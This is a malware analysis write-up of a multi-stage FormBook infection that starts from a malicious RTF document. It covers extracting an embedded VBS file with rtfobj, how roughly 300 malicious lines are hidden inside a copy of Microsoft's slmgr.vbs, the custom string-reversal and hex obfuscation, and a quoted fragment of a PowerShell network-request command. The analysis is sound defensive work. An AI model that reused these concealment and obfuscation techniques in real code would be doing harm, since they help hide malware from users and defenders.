# A FormBook Matryoshka

To those unfamiliar, a matryoshka is a set of Russian dolls of reducing size, where one fits inside the other. These things:

![Russian-Matryoshka-Doll-Transparent](https://user-images.githubusercontent.com/110191752/188217360-5c6865dc-8cbe-4155-9a7d-b4fa8cf59126.png)

A "malware matryoshka" refers to a sample that has many stages taking place before the final payload is triggered. 
This analysis will tackle a malicious RTF document that spreads the FormBook infostealer and fits this description quite well

## RTF Maldoc

The first stage is a maldoc. For those that wish to follow along, the file is available on Malware Bazaar ([f443d54ed21c034b61c6e71a4f4705f33684d36b5784aa997461a88e99dc5202](https://bazaar.abuse.ch/sample/f443d54ed21c034b61c6e71a4f4705f33684d36b5784aa997461a88e99dc5202/)).
We have two main options when tackling RTF files: either go with Didier Stevens' rtfdump.py or with rtfobj.py from oletools. The second tool provides a more user friendly output and is used with the syntax `rtfobj [FILE]`:

<img alt="rtfobj" src="https://user-images.githubusercontent.com/110191752/188217444-1b23ceea-8b5d-412e-9535-649f2b6bd31c.png">

There are two embedded objects, the first of which is a vbs script. RTF files do not support VBA macros, so embedding the script is a common alternative employed by attackers. The command to save the object to disk is `rtfobj -s 0 f443d54ed21c034b61c6e71a4f4705f33684d36b5784aa997461a88e99dc5202`. 

## Client.vbs

Let's inspect the contents of the embedded vbs file through Notepad++:

<img alt="Client.vbs" src="https://user-images.githubusercontent.com/110191752/188217513-4c5df89e-031f-4686-b46d-88aa24215a51.png">

Slmgr.vbs is an official Microsoft script for Volume Activation ([available here](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn502540(v=ws.11))) and it's **long**. Client.vbs is 2063 lines long, only around 300 of which are malicious. 

At line 1779 we find the first hint of something suspicious. Variables and function names starting at this line are long and nonsensical; there are also reversed strings all around.

<img alt="suspicious code" src="https://user-images.githubusercontent.com/110191752/188217575-555eed96-6b01-4890-aa6d-ce944635cfa8.png">

Since string reversing is incredibly common in maldocs, the presence of the **StrReverse** method in code is sure to raise suspicion. To avoid this, many authors create their own implementations of a string reversing function. In this particular case, it's `E0x8C0x9A0x1A0xDE0xB90x3F0x34()`. 

Another common obfuscation tactic is deploying hex strings. On this script, the function `Hex0x8C0x9A0x1A0xDE0xB90x3F0x34()` is responsible for translating hex back into ascii. Note also the similarity between the string reverse function name - `E0x8C0x9A0x1A0xDE0xB90x3F0x34`- and this one. Both carry the sufix **0x8C0x9A0x1A0xDE0xB90x3F0x34**. There is no reason for this except obfuscation/being annoying. Anyway, here is the hex obfuscation in practice:

<img alt="hex strings" src="https://user-images.githubusercontent.com/110191752/188217667-11a67047-98e8-4d9a-85af-3725631f7c6f.png">

And here is the same function after we clean it up a bit:

<img alt="malvbs3" src="https://user-images.githubusercontent.com/110191752/188217708-3242e3e3-4a7a-4eb8-b701-664da8bfd009.png">

These two tactics answer for most of the obfuscation in the script. I'll leave fully translating it as an exercise for the reader, since we have quite a few steps to go before reaching FormBook. Let's take a look at another function, which I've already deobfuscated:

<img alt="create-process" src="https://user-images.githubusercontent.com/110191752/188217769-af2b289d-2679-452a-a7f9-b22b3c9253d5.png">

Spawning Powershell with a command line, part of which is readable and clearly related to network requests:

> $w = 'GET /index.html HTTP/1.1`r`nHost: $p`r`nMozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0

<img alt="deobf-powershell" src="https://user-images.githubusercontent.com/110191752/188217228-c59cd8c8-8b3e-4999-ab6e-fcec5282bf69.png">
